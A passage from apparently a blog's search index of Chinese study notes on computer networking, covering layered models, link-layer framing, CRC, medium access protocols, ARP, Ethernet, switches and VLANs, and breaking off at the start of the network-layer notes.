这些指标的重要性，不亚于性能评价指标。\n分层模型 为什么要分层 对于复杂系统\n分层模型容易理解，容易厘清复杂系统中不同部分的关系 分层模型也有利于维护和系统更新 改变某一层服务的内容和实现方式，对于其他层毫无影响，层与层之间互不干扰 仍以飞机飞行为例，改变安检口的登机规则对系统其他部分毫无影响 优点：\n各层独立 灵活性好 结构可分割 易于实现和维护 能促进标准化 缺点：\n降低了效率 产生额外、重复的开销。 计算机网络的分层模型 类似的，对于互联网，我们也采用分层模型。\n应用层 应用层的任务是通过应用进程间的交互来完成特定网络应用 对于不同的网络应用需要有不同的应用层协议 传输层 运输层的任务就是负责向两台主机中进程之间的通信提供通用的数据传输服务 并不针对某个特定网络应用，而是多种应用可以使用同一个运输层服务 主要使用传输控制协议 TCP (Transmission Control Protocol) 和 用户数据报协议 UDP (User Datagram Protocol) 网络层 网络层负责为分组交换网上的不同主机提供通信服务 把运输层产生的报文段或用户数据报封装成分组或包进行传送 TCP/IP 体系中，由于网络层使用 IP 协议，因此分组也叫做 IP 数据报，或简称为数据报 链路层 两台主机之间的数据传输，总是在一段一段的链路上传送的，这就需要使用专门的链路层的协议 数据链路层将网络层交下来的 IP 数据报组装成帧(framing)，在两个相邻结点间的链路上传送帧(frame)。每一帧包括数据和必要的控制信息（如同步信息、地址信息、差错控制等） 物理层 在物理层上所传数据的单位是比特，物理层要考虑用多大的电压代表“1”或“0”，以及接收方如何识别出发送方所发送的比特。物理层还要确定连接电缆的插头应当有多少根引脚以及各引脚应如何连接。 传递信息所利用的一些物理媒体，如双绞线、同轴电缆、光缆、无线信道等，并不在物理层协议之内而是在物理层协议的下面 在互联网所使用的各种协议中，最重要的和最著名的就是 TCP 和 IP 两个协议。现在人们经常提到的 TCP/IP 并不一定是单指 TCP 和 IP 这两个具体的协议，而往往是表示互联网所使用的整个 TCP/IP 协议族(protocol suite) \u0026gt; OSI 参考模型把对等层次之间传送的数据单位称为该层的 协议数据单元 PDU (Protocol Data Unit) 。这个名词现已被许多非 OSI 标准采用。\n每一层都要负责不同的任务，但每一层都会为数据加上首部或尾部，因此虽然独立灵活，但产生了额外的开销\n多路复用和多路分解 TCP/IP 协议族在一些层使用多个协议，因此在发送时要将他们合并（封装），接收时要将他们分解\n当发送时要为不同的协议使用不同的头部字段，这样在接收时就能分开分解\nOSI 七层模型 一些概念 对等层次之间传送的数据单位称为该层的协议数据单元 PDU (Protocol Data Unit)。\n任何两个同样的层次把数据（即数据单元加上控制信息）通过水平虚线（逻辑上的水平）直接传递给对方。这就是所谓的“对等层”(peer layers)之间的通信。\n实体 (entity) 表示任何可发送或接收信息的硬件或软件进程\n协议是控制两个对等实体进行通信的规则的集合。在协议的控制下，两个对等实体间的通信使得本层能够向上一层提供服务\n要实现本层协议，还需要使用下层所提供的服务。（上层依赖下层）\n协议必须把所有不利的条件事先都估计到，而不能假定一切都是正常的和非常理想的，必须非常仔细地检查这个协议能否应付各种异常情况\n![[Pasted image 20220831220725.png]]\n","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%A6%82%E8%BF%B0/","section":"principle","summary":"Lord, make me an instrument of thy peace. Where there is hatred, let me sow love. — Francis of Assisi 概述 什么是互联网 什么是协议 边缘部分和核心部分 边缘部分-主机 主机通信方式-C/S：客户-服务器方式 主机通信方式-","tags":["计算机网络","概述"],"title":"概述"},{"categories":["principle","计算机网络"],"contents":" To follow, without halt, one aim: There is the secret of success. — Anna Pavlova\n计算机网络中的任何设备都需要实现链路层\n链路层 两类信道 两个子层 基本概念 数据链路控制（DLC） 流量控制和差错控制 三个基本问题 封装成帧 面向字符成帧 当发送出差错时 面向位成帧 透明传输 差错检测 CRC 检错技术 计算方法 介质访问控制（MAC）\u0026ndash;专用于广播信道 多路访问 信道划分 （channel partitioning） TDMA FDMA CDMA 随机接入 （random access） ALOHA 协议——最早的随机访问方法 纯 ALOHA slotted ALOHA 载波侦听多点接入/碰撞检测（CSMA/CD） 基本策略 碰撞检测 重传机制 脆弱时间 优缺点 受控接入（taking turns） Taking turns 轮流接入 轮询 polling 令牌传递 token passing 链路层寻址 48 位的 MAC 地址 EUI-48 MAC 地址有什么用 混杂方式(promiscuous mode) ARP 协议 – Address Resolution Protocol MAC 帧的格式 ARP 表-转 IP 为 MAC 在局域网中学习 ARP 表 不在局域网中学习 ARP 表 局域网\u0026ndash;典型广播信道 以太网 以太网的物理拓扑（physical topology） 以太网的帧的结构 无效的帧 以太网的特征（链路层的特征） 以太网的信道利用率 交换机 交换机学习交换表/转发表 交换机自学习产生的问题 虚拟局域网 VLAN 虚拟局域网的优点 虚拟局域网的实现方法 基于交换机端口 基于 MAC 地址 基于协议类型 基于 IP 子网地址 基于高层应用和服务 VLAN 的帧的格式 两类信道 有两类不同的链路\n点对点信道：专供两台设备，现今少用 广播信道：几对设备共享，现今多用 两个子层 数据链路控制（DLC）：处理点对点信道和广播信道共有的问题，功能包括成帧、流量控制、差错控制（差错检测和差错纠正） 介质访问控制（MAC）：只处理广播信道的问题 基本概念 链路(link)：从一个结点到相邻结点的一段物理线路（有线或无线） 数据链路(data link)：当需要在一条线路上传送数据时，除了必须有一条物理线路外，还必须有一些必要的通信协议来控制这些数据的传输，把实现这些协议的硬件和软件加到链路上，就构成了数据链路 通常，链路层实现为适配器（NIC、网卡）或者在芯片上实现\n数据链路控制（DLC） 流量控制和差错控制 流量控制在接收确认前调整能够被发送的数据数量 差错控制包括差错检测和差错纠正 在数据链路层中，差错控制是节点到节点的，只要有一个差错，就要求重传 三个基本问题 三个基本问题是封装成帧、透明传输和差错检测\n封装成帧 封装成帧(framing)就是在一段数据的前后分别添加首部和尾部，这样就构成了一个帧。 首部和尾部的一个重要作用就是进行帧定界（即确定帧的界限） 在发送帧时，是从帧首部开始发送的。 显然，为了提高帧的传输效率，应当使帧的数据部分长度尽可能地大于首部和尾部的长度。但是，每一种链路层协议都规定了所能传送的帧的数据部分长度上限—最大传送单元 MTU (Maximum Transfer Unit) 如果直接将整个数据打包成一个帧，那么流量控制和差错控制将非常低效。如果这个数据中有一点错误，那么就可能要求整个数据重传。 因此，要把一个报文拆成多个小的帧，这样错误只能影响比较小的一个部分\n面向字符成帧 当数据是由可打印的 ASCII 码组成的文本文件时，帧定界可以使用特殊的帧定界符：\n控制字符 SOH (Start Of Header) 放在一帧的最前面，表示帧的首部开始。 另一个控制字符 EOT (End Of Transmission) 表示帧的结束。 这样，用两个标记我们区分了不同的帧\n头部携带源地址和目的地址等控制信息；尾部携带差错检测冗余位\n当发送出差错时 假定发送端在尚未发送完一个帧时突然出故障，中断了发送。但随后很快又恢复正常，于是重新从头开始发送刚才未发 送完的帧。\n由于使用了帧定界符，接收端就知道前面收到的数据是个不完整的帧（只有首部开始符 SOH 而没有传输结束符 EOT），必须丢弃。 而后面收到的数据有明确的帧定界符（SOH 和 EOT），因此这是一个完整的帧，应当收下。 面向位成帧 在发送非文本信息（图片、音频等）时，数据中可能会出现和 SOH\\EOT 相同的字节，我们常常使用面向位成帧\nSOH\\EOT → 0 111 111 0：\n这种方法也可能会产生和上面一样的问题，数据中也可能出现和标记相同的字节，这时候我们使用位填充：\n当发送方连续读取到一个 0 和五个 1 时（011111），就在后面插入一个 0。虽然有时候数据并构不成标记，但这种方法避免了传输数据中出现标记。\n透明传输 由于帧的开始和结束的标记使用专门指明的控制字符，因此，所传输的数据中的任何 8 比特的组合一定不允许和用作帧定界的控制字符的比特编码一样，否则就会出现帧定界的错误。\n\u0026ldquo;透明\u0026quot;意味着：某一个实际存在的事物看起来却好像不存在一样 “在数据链路层透明传送数据”表示：无论什么样的比特组合的数据，都能够按照原样没有差错地通过这个数据链路层（数据链路层对这些数据来说是透明的） 因此，必须设法使数据中可能出现的控制字符“SOH”和“EOT”在接收端不被解释为控制字符：\n字节填充(byte stuffing)/字符填充(character stuffing)：\n发送端的数据链路层在数据中出现控制字符“SOH”或“EOT”的前面插入一个转义字符“ESC” 在接收端的数据链路层在把数据送往网络层之前删除这个插入的转义字符 如果转义字符也出现在数据当中，那么解决方法仍然是在转义字符的前面插入一个转义字符（当接收端收到连续的两个转义字符时，就删除其中前面的一个） 差错检测 1 可能会变成 0，而 0 也可能变成 1。这就叫做比特差错\n在信噪越小的情况下，误码率 BER (Bit Error Rate)越高\n相较于有线信道，无线网络会遇到像多个 WiFi 干扰等的情况，误码率比较高\n在链路层中，广泛使用循环冗余检验（CRC，Cyclic Redundancy Check）的检错技术\nCRC 检错技术 CRC 运算就是在数据 M 的后面添加供差错检测用的 n 位冗余码，然后构成一个帧发送出去，一共发送$(k + n)$位，这种为了进行检错而添加的冗余码常称为帧检验序列 FCS (Frame Check Sequence)\n计算方法 CRC 是基于模二运算的\n模二加法和模二减法相当于异或运算，他们是一回事 模二乘法相当于且运算 模二除法相当于模二乘法的逆运算 乘法和除法相当于多个加法和多个减法\n在发送端： 用二进制的模 2 运算进行$2^n$ 乘 M 的运算，这相当于在 M 后面添加 n 个 0。得到的$(k + n)$ 位的数除以收发双方事先商定的长度为 $(n + 1)$位的除数 P，得出商是 Q 而余数是 R（n 位，比 P 少一位），余数 R 就作为余码拼接在数据 M 的后面发送出去\n在接收端： 把收到的每一个帧都除以同样的除数 P（模 2 运算），然后检查得到的余数 R，如果在传输过程中无差错，那么经过 CRC 检验后得出的余数 R 肯定是 0，就接收；若余数 R ≠ 0（正确的概率很小很小），则判定这个帧有差错（但无法确定究竟是哪一位或哪几位出现了差错），就丢弃\n因为加法和减法是一回事，所以$2^nM=QP+R=QP+CRC$，但是发送的是$2^nM+CRC=QP+CRC+CRC=QP+CRC-CRC=QP$，所以如果没有错，那余数必为 0\n在数据链路层若仅仅使用循环冗余检验 CRC 差错检测技术，则只能做到对帧的无差错接受，即：“凡是接收端数据链路层接受的帧，我们都能以非常接近于 1 的概率认为这些帧在传输过程中没有产生差错”。 接收端丢弃的帧虽然曾收到了，但最终还是因为有差错被丢弃，即没有被接受。以上所述的可以近似地表述为（通常都是这样认为）：“凡是接收端数据链路层接受的帧均无差错”\n注意事项：\n选择除数，可以随机选择，也可以按照既定标准选择（按照国际通行标准选择，最高位和最低为必须为 1）。除数往往也用多项式表示，所以 CRC 又称多项式编码方法，这个多项式也称为生成多项式 余数的位数一定是比除数位数小一位，即使前面全是 0，也不要省略 帧检验序列 FCS – Frame Check Sequence。这里的冗余码就称为 FCS，由其他的校验方法，也能得到对应的 FCS 并不能做到可靠传输 ，必须加上确认和重传机制（其他层协议负责） 介质访问控制（MAC）\u0026ndash;专用于广播信道 多路访问 广播信道中，往往只有 1 条共享的广播信道 (single shared broadcast channel)，却有两个或多个节点，可能发生同时的数据传输\n这会导致干涉的发生（或“碰撞 collision”）：如果一个 node 同时需要发送两个信号，或者多个 node 需要同时发送多个信号。\n如何使众多用户能够合理而方便地共享通信媒体资源，这在技术上有两种方法：\n静态划分信道：频分复用、时分复用、波分复用和码分复用等，不适合局域网 动态媒体接入控制，又称为多点接入(multiple access)，包括随机接入和受控接入 分布式算法 – 每个节点上分别决定是否应该发送信号 “how nodes share channel”“何时可以发送信号” 注意，所有的协议通信用到的也是该广播信道自身！即，没有额外的信道用于协调这些节点。 共有三种信道复用的协议：\n信道划分 （channel partitioning） 将信道分为小块（例如分成 time slots、根据频率划分、采用不同的编码调制信号等） 每一小块被一个节点独享 TDMA TDMA：time division multiple access 时分复用\n节点分轮（in “rounds”）使用信道：每个节点在每一轮都会获得定长的 slot（通常 slot 的长度等于传输 packet 的时间）分配但未用的 slot 则保持闲置\n例：6 个节点，节点 1、3、4 发送数据，而节点 2、5、6 不发送数据 FDMA FDMA：frequency division multiple access 频分复用\n信道的频谱划分为不同的频段,每个节点分配使用固定的频段发送数据,对于不发送数据的节点，对应的频段即为闲置状态\nCDMA CDMA：code division multiple access 码分复用\n将需要发送的信号通过不同的编码进行调制，然后复用广播信道\n随机接入 （random access） 不划分信道，允许碰撞：\n如果恰巧有两个或更多的用户在同一时刻发送信息，那么在共享媒体上就要产生碰撞,使得这些用户的发送都失败 问题在于：\n尝试从“碰撞”中“恢复” 如何避免碰撞发生和碰撞发生怎么办 ALOHA 协议——最早的随机访问方法 纯 ALOHA 只要有站点需要发送帧，它就发送帧\n纯 ALOHA 依赖于接收方的确认，如果接收方确实收到了帧，它就会向发送方发送确认，只有当发送方收到该确认通知后，发送方才判定该帧成功发送，否则就要重发\n但是，如果多个同时发送失败的站点同时重发，那么还是很可能发送失败。所以，为了避免再一次堵车，纯 ALOHA 指定站点重发之前随机等待一段时间（补偿时间 $T_{B}$ ），相当于错峰开车\n同时，如果站点多次失败，站点就暂时躺平不发送了，等到以后再发送该帧，相当于摆烂\n我们程脆弱时间为可能碰撞的时间长度，则纯 ALOHA 虽弱时间为 2T\nslotted ALOHA 时间轴划分为等长的时隙（slots），通常是传输一帧的时间，而且节点均只在时隙开始的时候传输 节点的行为是同步的 如果超过两个节点在一个时隙同时传输，则所有节点能侦测到碰撞 所以时隙 ALOHA 是对纯 Aloha 的一种改进，其基本思想是把时间分成若干个相同的时间片，所有用户在时间片开始时刻同步接入网络信道，若发生冲突，则必须等到下一个时间片开始时刻再发送，这样就只有完全碰撞没有部分碰撞，脆弱时间从 2T 减少到 T\n步骤：\n当节点进入阅读器的识别范围后，节点自身携带的随机数发生器产生一随机数，节点按此随机数选择时隙，若查询时的时隙数与节点选择的时隙相匹配时节点即响应，并立即发送自身的数据信息 若时隙内有碰撞时，阅读器将终止节点继续发送信息并令节点等待下一次查询，该节点在以后的每一个时隙均以概率 𝑝 进行重传，直至传输成功 （C-collide,E-empty,S-success）\n优点：\n每个时隙中，都有一个节点可以一直以全速进行传输。 高度分布式算法：只需把所有节点的时隙进行同步即可，其余全部是通过节点自行探测解决（不像纯 ALOHA 要收到一个确认，然后进行决策） 算法十分简单 缺点：\n碰撞浪费了很多时隙，也会有很多时隙是闲置的 需要一个时隙去侦测碰撞的发生。但事实上节点可能只需要更少的时间就可以侦测碰撞 需要时钟同步（不然时隙的划分就没有用了） 效率不高\r载波侦听多点接入/碰撞检测（CSMA/CD） 基本策略 CSMA/CD 仅用于有线网络，不用于无线网络；无线网络使用 CSMA/CA\n发送数据前先监听广播信道，如果信道空闲，则发送整个帧；如果信道正忙，则延迟发送\n“碰撞检测”就是计算机边发送数据边检测信道上的信号电压大小，就是这个 CSMA 的侦听方式（节点同时在总线上发送数据时，总线上的信号电压摆动值将会增大（互相叠加））\n然后我们可以设置一个门限值，当电压超过门限值的时候，我们就判断它发生了碰撞\n因为有线网络中信号相对于噪声更明显，所以这种侦听方式比较有效；但在无线网络中太多噪声了，这种方式就不管用了\n一旦发现总线上出现了碰撞，总线上传输的信号就产生了严重的失真，无法从中恢复出有用的信息，就要立即停止发送，然后等待一段随机时间后再次发送。\n碰撞检测 最先发送数据帧的站，在发送数据帧后至多经过时间 2𝜏（两倍的端到端往返时延）就可知道发送的数据帧是否遭受了碰撞。 以太网的 端到端往返时延 2𝜏 称为争用期(contention period) ，又称为碰撞窗口(collision window)。 只有经过争用期这段时间还没有检测到碰撞，才能肯定这次发送不会发生碰撞。 由上图易知：一个站不可能同时进行发送和接收（但必须边发送边监听信道），当 B 已经收到 A 发送的数据，就准备一直接收，也就是说，只有在争用期内，B 没有发送数据，B 才能顺利开始接收，A 才算通过了考验\n重传机制 截断二进制指数退避(truncated binary exponential backoff)：\n让发生碰撞的站在停止发送数据后，等待信道变为空闲后推迟（这叫做退避）一个随机的时间\n$k = Min[重传次数, 10]$ $[0,1,…, 2^{k −1}]$中随机取一个数乘以争用期$τ$就是需要等待的时间\n当重传达 16 次仍不能成功时，则丢弃该帧，并向高层报告。\n使用上述退避算法可使重传需要推迟的平均时间随重传次数而增大（这也称为动态退避），因而减小发生碰撞的概率，有利于整个系统的稳定\n脆弱时间 优缺点 优点：\n简单 便宜 完全去中心化 缺点：\n使用 CSMA/CD 协议的以太网不能进行全双工通信而只能进行双向交替通信（半双工通信）。 每个站在发送数据之后的一小段时间内，存在着遭遇碰撞的可能性（争用期） 受控接入（taking turns） 用户不能随机地发送信息而必须服从一定的控制 节点轮流发送信息 典型代表有：\n分散控制的令牌环局域网 集中控制的多点线路探询(polling)，或称为轮询 Taking turns 轮流接入 让受控的节点轮流发送就不会碰撞了\n轮询 polling 主节点管理次节点，决定他们什么时候轮流发送数据（主节点需要具备一定智能，而次节点不需要），这种方法称为轮询\n存在轮询的开销、延迟、单点故障（即 master 节点）的问题\n令牌传递 token passing 受控的令牌从一个节点依次序传递到下一个节点，有令牌的节点即可发送帧（击鼓传花，传到花的就唱歌）\n节点之间不必物理地连成环，只要逻辑上每个节点都有前驱和后继即可\n存在传递令牌的开销、延迟，单点故障（令牌本身）的问题\n链路层寻址 链路层地址：又称为链路地址、物理层地址、MAC 地址\nMAC 地址用于将一个帧传输到另一个接口 used ‘locally” to get frame from one interface to another physically-connected interface (same network, in IP-addressing sense)\n48 位的 MAC 地址 EUI-48 IEEE 的注册管理机构 RA 负责向厂家分配地址字段 6 个字节中的前三个字节 (即高位 24 位)，称为组织唯一标识符。 地址字段 6 个字节中的后三个字节 (即低位 24 位) 由厂家自行指派，称为扩展唯一标识符，必须保证生产出的适配器没有重复地址。 因此就保证了全世界每个适配器、每个接口/端口，有唯一的 MAC 地址（$2^{24}$个不同的地址），用这种方式得到的 48 位地址称为 EUI-48，这里 EUI 表示扩展的唯一标识符(Extended Unique Identifier)\n同时，MAC 地址不是等级化的（与上级其他设备无关），保证了可移植性（可以把网卡从这个局域网移动到另一个局域网使用）\nMAC 地址有什么用 适配器从网络上每收到一个 MAC 帧就首先用硬件检查 MAC 帧中的 MAC 地址\n如果是发往本站的帧则收下，然后再进行其他的处理。 否则就将此帧丢弃，不再进行其他的处理。 这里“发往本站的帧”包括：\n单播(unicast)帧（一对一）：即收到的帧的 MAC 地址与本站的硬件地址相同。 广播(broadcast)帧（一对全体）：即发送给本局域网上所有站点的帧（全 1 地址）。 多播(multicast)帧（一对多）：即发送给本局域网上一部分站点的帧。 混杂方式(promiscuous mode) 嗅探器(Sniffer)就使用了设置为混杂方式的网络适配器\n适配器只要“听到”有帧在以太网上传输就都悄悄地接收下来，而不管这些帧是发往哪个站（抓包）\nARP 协议 – Address Resolution Protocol MAC 帧的格式 类型意为收到该帧之后，应传送给网络层的何种协议（大部分为 IP 协议）\nARP 表-转 IP 为 MAC 在实际工作时，不可能总是和与我们实际相邻的物理设备通信，我们往往会和离我们很远的主机通信，这样我们无法知道那个主机接口的 MAC 地址。这时候我们需要利用网络层的 IP 地址转为 MAC 地址 IP 地址是在全球范围内标识一台主机的地址\n局域网中的每个节点（主机、路由器等）都有一张 ARP 表，存储了局域网中某些节点的 IP 地址/MAC 地址的映射关系（\u0026lt;IP address; MAC address; TTL（多久删除）\u0026gt;）\n只有找到接口的 MAC 地址，我们才能在物理相邻的网络中与其通信\n在局域网中学习 ARP 表 由此可见，ARP 协议是“即插即用”的：节点创建自己的 ARP 表格，并不需要网络管理员的人工干涉\n不在局域网中学习 ARP 表 过程基本相同，但需要分开先从边缘路由器跳转，获得各自的 MAC 地址\n-\u0026gt; 具体过程，需要先学习 IP 协议，此处不展开\n局域网\u0026ndash;典型广播信道 因为局域网中的以太网过于优秀而被广泛使用，现在以太网几乎成为了局域网的同义词\n局域网最主要的特点是：网络为一个单位所拥有，且地理范围和站点数目均有限，每一台主机都是物理相邻的\n以太网 以太网，是现在的事实上的主流有线局域网技术\n单一芯片，可以实现多种带宽（自适应带宽） 第一个广泛采用的局域网技术 简单、便宜、速度快 以太网的物理拓扑（physical topology） 总线拓扑（直至 90 年代中期） 所有节点处于同一碰撞域（可能互相发生碰撞） 星形拓扑（现今） 采用交换机（switch） 每个“辐条”运行各自的以太网协议，各自组成碰撞域 星形环状拓扑结构有一个集线器充当连接线，站点通过两条电线连接集线器，这种结构即使一条链路失效了其他节点也能正常运行，因此不宜故障\n星形拓扑也可用于受控接入\n以太网的帧的结构 preamble 前同步码是不算以太网的帧的首部的，以太网的帧首部包括源地址、目的地址、类型，尾部为冗余码\n同见MAC 帧的结构\n一个以太网帧的长度一定要大于争用期，因传统规定，至少要大于 64 字节\n当数据字段的长度小于 46 字节时，应在数据字段的后面加入整数字节的填充字段，以保证以太网的 MAC 帧长不小于 64 字节。 传统的$10M/s$以太网，争用期为$51.2μs$，最短帧长为 64bit；而对于$100M/s$的以太网（快速以太网），争用期为$5.12μs$，最短帧长仍为 64bit。争用期变化而最短帧长不变\n无效的帧 帧长度不是整数字节 CRC 校验失败 数据字段的长度不在 46~1500 字节之间（MAC 帧长度不在 64~1518 字节之间） 对于检查出的无效 MAC 帧就简单地丢弃，以太网不负责重传丢弃的帧\n以太网的特征（链路层的特征） 无连接：发送的 NIC 和接收的 NIC 并不需要用握手来建立连接 不可靠：接受方不需要发送确认 如果发错了就要靠上层协议修补；上层如果不管下层也不管，没发到就没发到 以太网的信道利用率 在争用期内，各站点发送的帧可能碰撞，那它们碰撞之前花的时间就白费了，这样信道占用率就达不到 100%\n一个站在发送帧时出现了碰撞。经过一个争用期 2t 后（t 是以太网单程端到端传播时延），可能又出现了碰撞。这样经过若干个争用期后，一个站发送成功了。假定发送帧需要的时间是 $T_{0}$，总占用信道时间为$T_{0}+τ$ （最后一个比特发出去后还要在信道上跑$τ$的时间）\n因此，要提高以太网的信道利用率，就必须减小$τ$与$T_{0}$之比 ，我们可以将 这个比定义为 $a = \\frac{τ}{T_{0}}$ ，这样就可以知道，a 越小越好\n为了使得 a 更小，$τ$应尽可能小，而$T_{0}$应该大一点，这就是说，当数据率一定时，以太网的连线的长度受到限制，同时以太网的帧长不能太短\n假设碰撞不会发生，那么信道利用率的极限就应该是$S_{max}=\\frac{T_{0}}{T_{0}+τ}=\\frac{1}{1+a}$，因此 a 应远小于 1\n交换机 同见导论中的《交换机是什么》\n最初人们使用的是网桥(bridge)，后来用交换机(switch)取代了网桥\n为了在链路层扩展以太网，把不同网络连接在一起，我们就需要一个【链路层的专有设备】——交换机，通常也称为“第二层交换机”（L2 switch） 有一种非主流的结构，在第三层也有交换机\n作用：\n存储并转发以太网帧 检查收到的帧的 MAC 地址，选择性地转发该帧到一个或多个链路（寻址） 特点：\n交换机是透明的：主机并不知道交换机的存在 即插即用、自学习：交换机不需要手动配置，它自动学习网络拓扑 接口多：每个接口都直接与一个单台主机或另一个交换机相连，并且一般都工作在全双工方式。 并行性：能同时连通多对接口，使多对主机能同时通信。 能缓存帧 交换机使用了专用的交换结构芯片，用硬件转发，其转发速率非常高。 便宜好用：交换机的性能远远超过普通的集线器，而且价格并不贵。 交换机学习交换表/转发表 交换机通过自动学习知道通过哪个接口能够访问对应主机\n当交换机收到一个帧的时候，就记录源地址，然后根据目的地 MAC 地址，从交换表里面寻找对应条目\n如果找到了，就直接发送（若源地址==目的地址，直接丢弃该帧） 如果没找到，就同时向剩下的几个接口同时发送帧（泛洪 flooding） 在交换机最初发明的时候，这个表是静态的，需要手动添加，虽然简单但是麻烦，而且表会变得很臃肿\n因此，只有当几台主机开始发送数据的时候，交换机才需要开始学习（没用的东西学来干嘛）\n交换机自学习产生的问题 但有时为了增加网络的可靠性，在使用以太网交换机组网时，往往会增加一些冗余的链路。在这种情况下，自学习的过程就可能导致以太网帧在网络的某个环路中无限制地兜圈子\n如图，四个交换机的接口在自娱自乐\n解决方法：\nIEEE 的 802.1D 标准制定了一个生成树协议 STP\n要点是不改变网络的实际拓扑，但在逻辑上则切断某些链路，使得从一台主机到所有其他主机的路径是无环路的树状结构\n简而言之，避免环路的出现\n虚拟局域网 VLAN 情景一：CS 系的学生到 EE 系后还想使用 CS 系的局域网，但是这样就要经过中间整个局域网，效率又低，又不安全 情景二：如果公司中工程部门的两个工程师临时调去别的部门，然后又调回来，那就要在物理上重新布线两次\n官方定义：虚拟局域网 VLAN 是由一些局域网网段构成的与物理位置无关的逻辑组，而这些网段具有某些共同的需求。每一个 VLAN 的帧都有一个明确的标识符，指明发送这个帧的计算机是属于哪一个 VLAN。\n因此-\u0026gt;虚拟局域网其实只是局域网给用户提供的一种服务，而并不是一种新型局域网。\n如图，虚拟局域网内各主机是逻辑上的同组，而不是物理上的同组\n比如 B3 向 B1 发送信息， 以太网交换机不向虚拟局域网以外的计算机传送 B1 的广播信息，这样消息就不会发给其他的主机（交换机可能泛洪），这样子流量也节省了，也更安全了（防止混杂模式）\nVLAN 限制了接收广播信息的工作站数，使得网络不会因传播过多的广播信息 (即 “广播风暴” ) 而引起性能恶化\n虚拟局域网的优点 改善了性能 简化了管理 降低了成本 改善了安全性 虚拟局域网的实现方法 基于交换机端口 靠交换机的端口区分不同组的人，但这样就不能换端口，人员就不能移动\n属于在第一层划分虚拟局域网的方法\n基于 MAC 地址 根据MAC 地址划分组，但这样就需要手动维护一个表，比较麻烦。如果用户的 MAC 地址改变了，则需要管理员重新配置 VLAN。\n属于在第二层划分虚拟局域网的方法\n基于协议类型 根据以太网帧的第三个字段“类型”字段确定该类型的协议属于哪一个虚拟局域网\n属于在第二层划分虚拟局域网的方法\n基于 IP 子网地址 根据以太网帧的第三个字段“类型”字段和 IP 分组首部中的源 IP 地址字段确定该 IP 分组属于哪一个虚拟局域网\n属于在第三层划分虚拟局域网的方法\n基于高层应用和服务 根据高层应用或服务、或者它们的组合划分虚拟局域网，灵活但复杂\nVLAN 的帧的格式 虚拟局域网协议允许在以太网的帧格式中插入一个 4 字节的标识符，称为VLAN 标记 (tag)，用来指明该帧属于哪一个虚拟局域网\n相当于给物品打个标签\n插入 VLAN 标记得出的帧称为802.1Q 帧或带标记的以太网帧\n","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E9%93%BE%E8%B7%AF%E5%B1%82/","section":"principle","summary":"To follow, without halt, one aim: There is the secret of success. — Anna Pavlova 计算机网络中的任何设备都需要实现链路层 链路层 两类信道 两个子层 基本概念 数据链路控制（DLC） 流量控制和差错控制 三个基本问题","tags":["计算机网络","链路层"],"title":"链路层"},{"categories":["principle","计算机网络"],"contents":" It isn\u0026rsquo;t where you come from, it\u0026rsquo;s where you\u0026rsquo;re going that counts. — Ella Fitzgerald\n链路层干的事情是局部的，网络层干的事情是全局的\n网络层 概述 网络层提供的服务 路由和转发 网络层提供的两种分组交换的方法 数据报方法：无连接服务（现在使用的） 虚电路方法：面向连接服务 两种方法相比较 路由器架构 总体架构 输入 交换 输出 调度策略 基于优先级 IP 协议 (网际协议) IP 地址 IP地址和MAC地址 为什么不直接用硬件地址进行通信？ 编址方法 分类 IP 地址 点分十进制记法 常见的三类 IP 地址（A、B、C） 分类IP地址的特点 分类IP的缺点 划分子网 划分子网的优缺点 子网掩码——找出IP地址中的子网号 固定长度子网和变长子网 超网（无分类编址）CIDR – Classless Inter-Domain Routing CIDR地址块 路由聚合 (route aggregation)/构成超网 (supernetting) CIDR的简写 CIDR的特点 地址聚合 IP数据报 首部 可变部分 NAT-Network Address Translation 网络地址转换 本地地址和全球地址 专用于本地地址的地址块 NAT转换的具体内容 纯NAT的计算方法 纯NAT的局限 NAPT的计算方法 NAPT的缺点 IPv6 IPv6的特点 IPv6的首部 IPv6的地址 冒号十六进制记法 简写 特殊记法 分类 向IPv6过渡 双协议栈 隧道技术 路由协议/算法 理想的路由算法 分层次的路由选择协议 使用原因 两类路由选择协议 【内部网关协议】路由信息协议 RIP协议 RIP的特点 路由表的建立 RIP2协议报文格式 RIP协议的优缺点 【内部网关协议】开放最短路径优先 OSPF (Open Shortest Path First)协议 三个要点 链路状态数据库 (link-state database) OSPF的区域 OSPF的特点 OSPF分组格式 指定的路由器 与RIP的对比 【外部网关协议】BGP协议 BGP发言人 BGP交换路由信息 BGP发言人交换路径向量 BGP协议的特点 BGP协议的四种报文 BGP协议报文格式 两类基本路由算法 网络的图的抽象 链路成本 路由算法的分类 链路状态算法 距离向量算法 概述 网络层从发送端到接收端传输数据段（segment）\n发送端 接收端 将传输层给的数据段包装成数据报 解包数据包给传输层 每个端、主机、路由都要部署网络层，但是不是所有的网络设备都需要部署网络层（如交换机不需要）\n路由检查 IP 地址，并选择路径分组转发\n网络层提供的服务 分组：把数据分组打包并在终点解包 路由：数据要经过路由的中转才能到达目的地 一个物理网络是网络和连接它们的路由的总和 转发：分组到达路由器的一个端口时，路由器所采取的行为。路由器的决策依据转发表（路由表） 路由和转发 数据平面 控制平面 本地、基于单个路由器的行为 Network-wide 的行为 主要行为：转发 主要行为：路由 网络层提供的两种分组交换的方法 数据报方法：无连接服务（现在使用的） 网络层只负责将数据报从源端发送到目的端，向上只提供简单灵活的、无连接的、尽最大努力交付的数据报服务，不保证质量，智能的事情摆在主机上做。\n使用无连接服务时，每一个正在传送的分组都是一个独立的实体，同属于一个报文的诸分组无联系，每一个分组的路由都基于它的头部信息（源地址和目的地址）\n优点：\n网络的造价大大降低 运行方式灵活 能够适应多种应用 （便宜灵活用途广）\n虚电路方法：面向连接服务 借鉴于电信网的成功经验，让网络负责可靠交付，通信之前先建立虚电路 (Virtual Circuit)，以保证双方通信所需的一切网络资源\n虚电路表示这只是一条逻辑上的连接，分组都沿着这条逻辑连接按照存储转发方式传送，而并不是真正建立了一条物理连接。 请注意，电路交换的电话通信是先建立了一条真正的连接 每个分组都基于分组的标签（虚电路标识符）被转发（这让源地址和目的地址好像变得无用）\n两种方法相比较 路由器架构 网络层使用的路由器称为网关\n总体架构 输入 若交换结构转发分组的速度比所有输入端口分组到达的速度和要慢，则会在输入端口的缓存中发生排队 若缓存溢出，则会产生排队延时或分组丢失 HOL 